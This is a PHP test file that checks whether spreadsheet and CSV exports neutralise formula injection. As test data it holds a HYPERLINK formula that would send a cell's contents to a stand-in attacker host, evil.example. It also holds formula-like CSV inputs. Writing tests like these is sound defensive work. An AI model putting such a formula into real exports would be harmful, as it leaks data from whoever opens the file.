<?php

namespace Tests\Feature\Domain;

use App\Domain\Reports\ExcelExport;
use App\Domain\Tax\LegacyCsvWriter;
use ReflectionMethod;
use Tests\TestCase;
use ZipArchive;

/** Text that looks like a formula leaves an export as text: opening the file runs nothing. */
class ExportSafetyTest extends TestCase
{
    public function test_a_spreadsheet_writes_text_never_a_formula(): void
    {
        $response = ExcelExport::download('Sales by customer', 'November 2026', ['Customer', 'Total'], [
            ['=HYPERLINK("https://evil.example/?d="&B6,"Details")', 1_500_000],
            ['Acme Trading', 2_000_000],
        ]);
        $file = $response->getFile()->getPathname();
        $this->assertMatchesRegularExpression('/^[0-9a-f-]{36}\.xlsx$/', basename($file), 'stored under a name of its own');
        $this->assertStringStartsWith('sales-by-customer-', $response->headers->get('content-disposition') ? explode('filename=', $response->headers->get('content-disposition'))[1] : '');

        $zip = new ZipArchive;
        $zip->open($file);
        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        @unlink($file);
        $this->assertStringNotContainsString('<f>', $sheet);
        $this->assertStringContainsString('HYPERLINK', $sheet, 'kept, as text');
        $this->assertStringContainsString('1500000', $sheet, 'numbers stay numbers');
    }

    public function test_a_csv_cell_starting_like_a_formula_is_quoted(): void
    {
        $cell = new ReflectionMethod(LegacyCsvWriter::class, 'cell');
        $this->assertSame("'=1+2", $cell->invoke(null, '=1+2'));
        $this->assertSame("'@SUM(A1)", $cell->invoke(null, '@SUM(A1)'));
        $this->assertSame("'+62 21 555", $cell->invoke(null, '+62 21 555'));
        $this->assertSame('-150000', $cell->invoke(null, '-150000'), 'a negative number is a number');
        $this->assertSame('Acme Trading', $cell->invoke(null, 'Acme Trading'));
    }
}
